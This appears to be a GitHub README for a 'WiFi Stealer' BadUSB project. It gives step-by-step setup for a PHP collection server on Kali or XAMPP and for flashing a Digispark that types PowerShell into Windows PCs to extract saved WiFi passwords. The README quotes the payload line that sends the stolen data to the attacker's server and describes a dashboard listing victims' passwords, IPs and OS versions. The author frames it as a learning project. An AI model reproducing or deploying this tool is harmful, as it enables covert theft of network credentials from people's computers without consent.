# WiFi Stealer Dashboard

A BadUSB payload that grabs WiFi credentials from Windows machines and displays them on a web dashboard.

![Dashboard Preview](WEB_SERVER_PICTURE.png)

## What it does

- Attiny85/Digispark acts as a keyboard when plugged into Windows
- Runs PowerShell to extract saved WiFi passwords
- Sends everything to a PHP server (your Kali box or Windows machine)
- Nice dashboard to see all the captured creds

---

## Setting Up the Server

You can host the dashboard on either Kali or Windows. Pick whichever you're comfortable with.

### On Kali Linux

```bash
# Grab the repo
cd ~
git clone https://github.com/Zypher17/wifi-stealer.git
cd wifi-stealer

# Install web server stuff
sudo apt update
sudo apt install apache2 php

# Start Apache
sudo systemctl enable apache2
sudo systemctl start apache2

# Check your IP - write this down, you'll need it later
ip addr show | grep "inet " | grep -v 127.0.0.1

# Copy files over
sudo cp index.php /var/www/html/
sudo cp wifi-recv.php /var/www/html/

# Set up the log file
sudo touch /var/www/html/wifi_creds.log
sudo chown www-data:www-data /var/www/html/{index.php,wifi-recv.php,wifi_creds.log}
sudo chmod 664 /var/www/html/wifi_creds.log
```

Make sure it's working:
```bash
curl -X POST http://localhost/wifi-recv.php -d "data=test"
cat /var/www/html/wifi_creds.log
```

If you see "test" in the output, you're good to go.

Open `http://YOUR_IP/index.php` in a browser (replace YOUR_IP with the IP you found earlier).

---

### On Windows (XAMPP)

1. **Download XAMPP** from https://www.apachefriends.org - just get the basic version with Apache and PHP

2. **Install it** - pretty straightforward, just keep clicking next

3. **Start Apache** from the XAMPP control panel

4. **Get the project files:**
   ```powershell
   git clone https://github.com/Zypher17/wifi-stealer.git
   # Or just download the ZIP from GitHub if you don't have git
   ```

5. **Copy to the web folder:**
   ```powershell
   Copy-Item index.php C:\xampp\htdocs\
   Copy-Item wifi-recv.php C:\xampp\htdocs\
   ```

6. **Create the log file** (run PowerShell as admin):
   ```powershell
   New-Item C:\xampp\htdocs\wifi_creds.log -ItemItem File
   icacls C:\xampp\htdocs\wifi_creds.log /grant Users:F
   ```

7. **Find your IP:**
   ```powershell
   ipconfig
   ```
   Look for the IPv4 address - that's what you need.

Test it works:
```powershell
Invoke-WebRequest -Uri 'http://localhost/wifi-recv.php' -Method POST -Body "data=test"
Get-Content C:\xampp\htdocs\wifi_creds.log
```

Visit `http://localhost/index.php` - should see the dashboard.

---

## Programming the Digispark

![Attiny85 Digispark](attiny85-digispark.jpg)

### Getting Arduino IDE ready

1. Open Arduino IDE
2. File → Preferences
3. Paste this into "Additional Boards Manager URLs":http://digistump.com/package_digistump_index.json
4. Tools → Board → Boards Manager
5. Search for "Digistump AVR" and install it
6. Select Board: "Digispark (Default - 16.5MHz)"

### Uploading the payload

1. Open `payloads/wifi_stealer_digispark.ino` from the repo

2. **IMPORTANT:** Find this line and change the IP address:
```cpp
DigiKeyboard.print(
  F("Invoke-WebRequest -UseBasicParsing -Uri 'http://192.168.1.8/wifi-recv.php' -Method POST -Body $b")
);
```

Change `192.168.1.8` to whatever IP your server is running on. That's the Kali or Windows machine from earlier.

3. Click Upload

4. Wait for it to say "Plug in device now..." then plug in your Digispark

5. Should say "success" after a few seconds

Now whenever you plug that Digispark into a Windows PC, it'll:
- Pop open PowerShell
- Grab all saved WiFi passwords
- Send them to your server
- Close everything and clean up

Pretty fast - takes like 5-10 seconds depending on how many networks they have saved.

---

## Viewing the Results

Everything gets saved to `wifi_creds.log` and shows up on the dashboard at:
- `http://YOUR_SERVER_IP/index.php`

The dashboard shows:
- How many machines you've hit
- All the SSIDs and passwords
- IP addresses of the victims
- Their OS version
- You can delete entries too if you want

---

## Troubleshooting

**Dashboard won't load:**
- Make sure Apache/XAMPP is actually running
- Check if you can access `http://localhost` - should show the Apache default page
- Look at the log file permissions, Apache needs to write to it

**Not getting any data:**
- Double-check the IP in the Arduino code matches your server
- Firewall might be blocking it - try disabling temporarily to test
- Make sure the log file exists and is writable

**Digispark upload fails:**
- Windows might need drivers - Google "Digispark drivers Windows"
- Try a different USB port
- Make sure you plug it in AFTER clicking upload, not before
- Some USB 3.0 ports are weird with Digispark, try USB 2.0

**Getting garbage data:**
- Target machine might not have admin rights
- Windows Defender could be blocking PowerShell execution
- Some corporate machines have strict policies that prevent this

---

## Notes

Built this to learn more about BadUSB attacks and how easy it is to grab WiFi creds from Windows. Pretty scary how quick it is honestly.

The PHP code is super simple - literally just writes POST data to a file. Could definitely make it fancier with a database and stuff, but keeping it simple for now.

Feel free to fork and improve it. Would be cool to add:
- Encryption for the data in transit
- Better logging with timestamps
- Export to CSV
- Maybe a filter to ignore duplicates
